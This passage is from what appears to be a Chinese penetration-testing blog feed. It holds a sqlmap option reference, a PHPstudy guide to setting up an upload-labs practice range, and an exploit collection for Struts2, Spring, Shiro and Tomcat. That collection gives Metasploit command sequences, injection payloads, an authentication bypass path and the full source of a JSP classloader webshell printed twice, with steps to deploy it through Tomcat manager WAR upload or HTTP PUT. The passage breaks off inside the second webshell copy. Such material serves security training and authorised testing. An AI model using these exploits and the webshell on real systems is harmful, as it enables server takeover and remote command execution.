指定要导出的数据表条目结束行数</span><br><span class="line">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br><span class="line">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br><span class="line">--sql-query=QUERY   指定要执行的 SQL 语句</span><br><span class="line">--sql-shell         调出交互式 SQL shell</span><br><span class="line">--sql-file=SQLFILE  执行文件中的 SQL 语句</span><br></pre></td></tr></table></figure><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a><font style="color:rgb(35, 38, 59);">暴力破解</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于暴力破解测试</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--common-tables     检测常见的表名是否存在</span><br><span class="line">--common-columns    检测常用的列名是否存在</span><br></pre></td></tr></table></figure><h3 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a><font style="color:rgb(35, 38, 59);">用户自定义函数注入</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于创建用户自定义函数</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--udf-inject        注入用户自定义函数</span><br><span class="line">--shared-lib=SHLIB  共享库的本地路径</span><br></pre></td></tr></table></figure><h3 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a><font style="color:rgb(35, 38, 59);">访问文件系统</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于访问后端 DBMS 的底层文件系统</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">--file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br><span class="line">--file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br><span class="line">--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br></pre></td></tr></table></figure><h3 id="访问操作系统"><a href="#访问操作系统" class="headerlink" title="访问操作系统"></a><font style="color:rgb(35, 38, 59);">访问操作系统</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于访问后端 DBMS 的底层操作系统</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--os-cmd=OSCMD      执行操作系统命令</span><br><span class="line">--os-shell          调出交互式操作系统 shell</span><br><span class="line">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br><span class="line">--os-bof            利用存储过程的缓冲区溢出</span><br><span class="line">--priv-esc          数据库进程用户提权</span><br><span class="line">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br><span class="line">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br></pre></td></tr></table></figure><h3 id="访问-Windows-注册表："><a href="#访问-Windows-注册表：" class="headerlink" title="访问 Windows 注册表："></a><font style="color:rgb(35, 38, 59);">访问 Windows 注册表：</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于访问后端 DBMS 的 Windows 注册表</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--reg-read          读取一个 Windows 注册表键值</span><br><span class="line">--reg-add           写入一个 Windows 注册表键值数据</span><br><span class="line">--reg-del           删除一个 Windows 注册表键值</span><br><span class="line">--reg-key=REGKEY    指定 Windows 注册表键</span><br><span class="line">--reg-value=REGVAL  指定 Windows 注册表键值</span><br><span class="line">--reg-data=REGDATA  指定 Windows 注册表键值数据</span><br><span class="line">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br></pre></td></tr></table></figure><h3 id="通用选项："><a href="#通用选项：" class="headerlink" title="通用选项："></a><font style="color:rgb(35, 38, 59);">通用选项：</font></h3><p><font style="color:rgb(35, 38, 59);">以下选项用于设置通用的参数</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">-s SESSIONFILE      从文件（.sqlite）中读入会话信息</span><br><span class="line">-t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件</span><br><span class="line">--batch             从不询问用户输入，使用默认配置</span><br><span class="line">--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）</span><br><span class="line">--check-internet    在访问目标之前检查是否正常连接互联网</span><br><span class="line">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br><span class="line">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）</span><br><span class="line">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br><span class="line">--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）</span><br><span class="line">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br><span class="line">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br><span class="line">--eta               显示每个结果输出的预计到达时间</span><br><span class="line">--flush-session     清空当前目标的会话文件</span><br><span class="line">--forms             解析并测试目标 URL 的表单</span><br><span class="line">--fresh-queries     忽略存储在会话文件中的查询结果</span><br><span class="line">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br><span class="line">--hex               获取数据时使用 hex 转换</span><br><span class="line">--output-dir=OUT..  自定义输出目录路径</span><br><span class="line">--parse-errors      从响应中解析并显示 DBMS 错误信息</span><br><span class="line">--preprocess=PRE..  使用给定脚本预处理响应数据</span><br><span class="line">--repair            重新导出具有未知字符的数据（?）</span><br><span class="line">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br><span class="line">--scope=SCOPE       用正则表达式从提供的代理日志中过滤目标</span><br><span class="line">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br><span class="line">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br><span class="line">--update            更新 sqlmap</span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a><font style="color:rgb(35, 38, 59);">杂项</font></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）</span><br><span class="line">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br><span class="line">--answers=ANSWERS   设置预定义回答（例如：“quit=N,follow=N”）</span><br><span class="line">--beep              出现问题提醒或在发现 SQL 注入时发出提示音</span><br><span class="line">--cleanup           指定移除 DBMS 中的特定的 UDF 或者数据表</span><br><span class="line">--dependencies      检查 sqlmap 缺少（可选）的依赖</span><br><span class="line">--disable-coloring  关闭彩色控制台输出</span><br><span class="line">--gpage=GOOGLEPAGE  指定页码使用 Google dork 结果</span><br><span class="line">--identify-waf      针对 WAF/IPS 防护进行彻底的测试</span><br><span class="line">--mobile            使用 HTTP User-Agent 模仿智能手机</span><br><span class="line">--offline           在离线模式下工作（仅使用会话数据）</span><br><span class="line">--purge             安全删除 sqlmap data 目录所有内容</span><br><span class="line">--skip-waf          跳过启发式检测 WAF/IPS 防护</span><br><span class="line">--smart             只有在使用启发式检测时才进行彻底的测试</span><br><span class="line">--sqlmap-shell      调出交互式 sqlmap shell</span><br><span class="line">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br><span class="line">--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）</span><br><span class="line">--wizard            适合初级用户的向导界面</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHPstudy搭建靶场教程</title>
      <link href="/2024/12/16/phpstudy%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%95%99%E7%A8%8B/"/>
      <url>/2024/12/16/phpstudy%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>Windows这边我使用的phpstudy来搭建靶场的，phpstudy的安装可以参考我上一篇文章《PhpStudy》的安装教程</p><p>phpstudy搭建网站的教程还是挺简单的，因为不需要linux的命令行和安装docker环境那么麻烦，所以我们有空可以自己尝试搭建一下靶场玩一玩</p><p><strong>首先我们可以先想一下自己需要什么靶场，比如我的这个示例是安装文件上传的靶场</strong></p><p><strong>1、先去github上面去找一下文件上传的靶场并把它压缩包下载下来</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134118041.png" alt="image-20241216134117681"></p><p><strong>2、然后把压缩包解压到我们的任意文件的位置即可</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134124551.png" alt="image-20241216134124435"><strong>3、然后我们打开phpstudy的网站-localhost的操作下的管理</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134128150.png" alt="image-20241216134127957"><strong>4、打开根目录，然后把我们刚刚解压的文件上传粘贴进去</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134131851.png" alt="image-20241216134131546"><strong>5、然后我们打开小皮的WNMP，点击启动</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134135407.png" alt="image-20241216134135212"></p><p><strong>6、打开后是打开了mysql和nginx的功能</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134141783.png" alt="image-20241216134141604"></p><p><strong>7、然后我们打开浏览器，输入</strong><a href="http://127.0.0.1/upload-labs-master/"><strong>http://127.0.0.1/upload-labs-master/</strong></a><strong>就可以进入到我们自己搭建的靶场了</strong><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216134145401.png" alt="image-20241216134145154">然后我们的文件上传靶场就搭建成功了，可以自己快快乐乐的打靶场了，这个是没网的时候娱乐娱乐的，如果有网的话，还是打线上的要好一点，因为自己搭建的靶场多多少少会有一些问题</p><p><strong>教程如果有不清晰或不明白的地方，欢迎大家评论区留言讨论。</strong></p><p><strong>如果有什么不对或者需要改正的地方，请多多指教！欢迎讨论交流！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>毛豆の漏洞收集库</title>
      <link href="/2024/12/16/%E3%80%8C%E6%BC%8F%E6%B4%9E%E5%BA%93%E3%80%8D%E6%AF%9B%E8%B1%86%E3%81%AE%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%BA%93/"/>
      <url>/2024/12/16/%E3%80%8C%E6%BC%8F%E6%B4%9E%E5%BA%93%E3%80%8D%E6%AF%9B%E8%B1%86%E3%81%AE%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2框架"><a href="#Struts2框架" class="headerlink" title="Struts2框架"></a>Struts2框架</h1><h2 id="S2-061-S2-062-命令执行-CVE-2020-17530"><a href="#S2-061-S2-062-命令执行-CVE-2020-17530" class="headerlink" title="S2-061(S2-062)命令执行 CVE-2020-17530"></a>S2-061(S2-062)命令执行 CVE-2020-17530</h2><h3 id="利用条件-作用"><a href="#利用条件-作用" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>利用条件: Apache Struts 2.0.0 - 2.5.29 </code></strong></p><p><strong>作用：命令执行</strong></p><h3 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>传参处检测Payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=%25%7b+%27test%27+%2b+(2021+%2b+20).toString()%7d</span><br></pre></td></tr></table></figure><p><strong>检测脚本</strong></p><p>使用方法：python struts2-s2-061.py [url]</p><p><a href="https://sirbei.com/wp-content/uploads/2023/06/962565057.zip">struts2-s2-061.zip</a></p><p><strong>利用方法(Kali)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">search struts</span><br><span class="line"></span><br><span class="line">use exploit/multi/http/struts2_multi_eval_ognl</span><br><span class="line"></span><br><span class="line">set RHOSTS IP</span><br><span class="line"></span><br><span class="line">set SRVHOST IP</span><br><span class="line"></span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">成功后输入shell即可执行命令</span><br></pre></td></tr></table></figure><h1 id="Spring框架"><a href="#Spring框架" class="headerlink" title="Spring框架"></a>Spring框架</h1><h2 id="Spring-Web-Flow框架远程代码执行（CVE-2017-4971）"><a href="#Spring-Web-Flow框架远程代码执行（CVE-2017-4971）" class="headerlink" title="Spring Web Flow框架远程代码执行（CVE-2017-4971）"></a>Spring Web Flow框架远程代码执行（CVE-2017-4971）</h2><h3 id="利用条件-作用-1"><a href="#利用条件-作用-1" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p>影响版本：Spring WebFlow 2.4.0 - 2.4.4</p><h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p><a href="https://www.cnblogs.com/cute-puli/p/13363752.html">漏洞复现-CVE-2017-4971-Spring Web Flow 远程代码执行</a></p><h2 id="Spring-Security-OAuth2远程命令执行（CVE-2016-4977）"><a href="#Spring-Security-OAuth2远程命令执行（CVE-2016-4977）" class="headerlink" title="Spring Security OAuth2远程命令执行（CVE-2016-4977）"></a>Spring Security OAuth2远程命令执行（CVE-2016-4977）</h2><h3 id="利用条件-作用-2"><a href="#利用条件-作用-2" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p>影响版本：2.0.0-2.0.9、1.0.0-1.0.5，有账号密码的前提下实现RCE。</p><p>作用：授权状态下远程命令执行</p><h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><p>[复现](<a href="https://www.freebuf.com/articles/web/275607.html#:~:text=X-Application-Context-,1,-%E3%80%81Spring">https://www.freebuf.com/articles/web/275607.html#:~:text=X-Application-Context-,1,-、Spring</a> Security OAuth2)</p><p>示例payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://192.168.74.128:8080/oauth/authorize?response_type=$&#123;2*3&#125;&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</span><br></pre></td></tr></table></figure><p>页面最后回显[6]</p><h1 id="shiro框架"><a href="#shiro框架" class="headerlink" title="shiro框架"></a>shiro框架</h1><h2 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h2><h3 id="利用条件-作用-3"><a href="#利用条件-作用-3" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>shiro版本&lt;=1.2.4(使用了默认秘钥)</code></strong></p><p><strong>作用: 直接RCE</strong></p><h3 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>工具：<a href="https://github.com/SummerSec/ShiroAttack2/releases">https://github.com/SummerSec/ShiroAttack2/releases</a></strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216105923464.png" alt="image-20241216105916107"></p><h2 id="认证绕过漏洞"><a href="#认证绕过漏洞" class="headerlink" title="认证绕过漏洞"></a>认证绕过漏洞</h2><h3 id="利用条件-作用-4"><a href="#利用条件-作用-4" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>利用条件：Apache Shiro &lt; 1.5.1</code></strong></p><p><strong>作用：绕过登录验证，直接访问后台</strong></p><h3 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong>相关文章：<a href="https://blog.csdn.net/qq_17622203/article/details/123635054"> CVE-2020-1957 shiro权限绕过简单分析_0justin0的博客-CSDN博客</a></strong></p><p><strong>简述：当环境存在漏洞时。后台路径为&#x2F;admin&#x2F;，需要特定用户登录才可以访问，不然访问&#x2F;admin&#x2F;会跳转到登录页。访问url&#x2F;xxx&#x2F;..;&#x2F;admin&#x2F;，即可绕过权限认证进入后台。</strong></p><h1 id="Apache-Tomcat"><a href="#Apache-Tomcat" class="headerlink" title="Apache Tomcat"></a>Apache Tomcat</h1><h2 id="Tomcat-8-开启manager"><a href="#Tomcat-8-开启manager" class="headerlink" title="Tomcat 8(开启manager)"></a>Tomcat 8(开启manager)</h2><h3 id="漏洞靶场环境"><a href="#漏洞靶场环境" class="headerlink" title="漏洞靶场环境"></a>漏洞靶场环境</h3><p><strong>vulhub中的tomcat&#x2F;tomcat8</strong></p><h3 id="利用条件-作用-5"><a href="#利用条件-作用-5" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong>条件：需要开启tomcat的manager管理页面。URL：<a href="http://xxx/manager/html">http://xxx/manager/html</a></strong></p><p><strong>作用：生成木马</strong></p><h3 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h3><ul><li><code>爆破出tomcat后台的账号密码</code></li></ul><p>使用kali的msfconsole进行爆破tomcat后台密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">use auxiliary/scanner/http/tomcat_mgr_login</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">set RHOSTS &lt;目标主机地址&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">set RPORT &lt;目标主机端口&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><ul><li>制作一句话木马war包，先将下面代码的一句话木马重命名为shell.jsp，然后将shell.jsp压缩为shell.zip，再将shell.zip重命名为shell.war</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line"></span><br><span class="line">            super(c);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line"></span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line"></span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line"></span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line"></span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    String cls = request.getParameter(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line"></span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li>在url&#x2F;manager&#x2F;html找到WAR file to deploy，将制作好的shell.war包上传，即可生成木马，然后访问url&#x2F;shell&#x2F;shell,jsp，使用蚁剑即可连接，密码password</li></ul><h2 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h2><h3 id="漏洞靶场环境-1"><a href="#漏洞靶场环境-1" class="headerlink" title="漏洞靶场环境"></a>漏洞靶场环境</h3><p>vulhub | tomcat&#x2F;CVE-2020-1938</p><h3 id="利用条件-作用-6"><a href="#利用条件-作用-6" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>条件</code></strong></p><ul><li>Apache Tomcat 9.x &lt; 9.0.31</li><li>Apache Tomcat 8.x &lt; 8.5.51</li><li>Apache Tomcat 7.x &lt; 7.0.100</li><li>Apache Tomcat 6.x</li></ul><p><strong>需要开启8009端口AJP协议</strong></p><p><strong><code>作用</code></strong></p><ul><li>文件读取</li><li>如果提前上传了含一句话木马jsp脚本的txt文件，配合文件读取可以反弹SHELL，达到远程RCE</li></ul><h3 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h3><ul><li>仅文件读取，使用kali的msfconsole，执行下面代码，即可读取主机内文件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">use auxiliary/admin/http/tomcat_ghostcat</span><br><span class="line"></span><br><span class="line">set RHOSTS &lt;目标主机&gt;</span><br><span class="line"></span><br><span class="line">set FILENAME &lt;主机内文件&gt;</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><h3 id="利用条件-作用-7"><a href="#利用条件-作用-7" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>利用条件：配置文件/usr/local/tomcat/conf/web.xml，代码块的readonly要为false（非默认设置），导致可以使用PUT方法上传文件</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line"></span><br><span class="line">&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;</span><br></pre></td></tr></table></figure><p><strong><code>作用：直接上传木马文件GetShell</code></strong></p><h3 id="利用方法-7"><a href="#利用方法-7" class="headerlink" title="利用方法"></a>利用方法</h3><p><strong><code>一、PUT方法，文件名添加/绕过上传限制</code></strong></p><p><strong>抓取网页请求包，然后将方法修改为PUT，将路径改为shell.jsp&#x2F;(注意要在后面加入&#x2F;，来绕过上传限制)，在POST数据位放入一句话木马。</strong></p><p><strong>发送数据包后响应状态码为201即为成功。路径为URL&#x2F;shell.jsp。服务器内路径为&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT</strong></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216105931695.png" alt="image-20241216105931529"></p><p>附：JSP一句话木马，密码password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line"></span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line"></span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line"></span><br><span class="line">            super(c);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line"></span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line"></span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line"></span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line"></span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line"></span><br><span 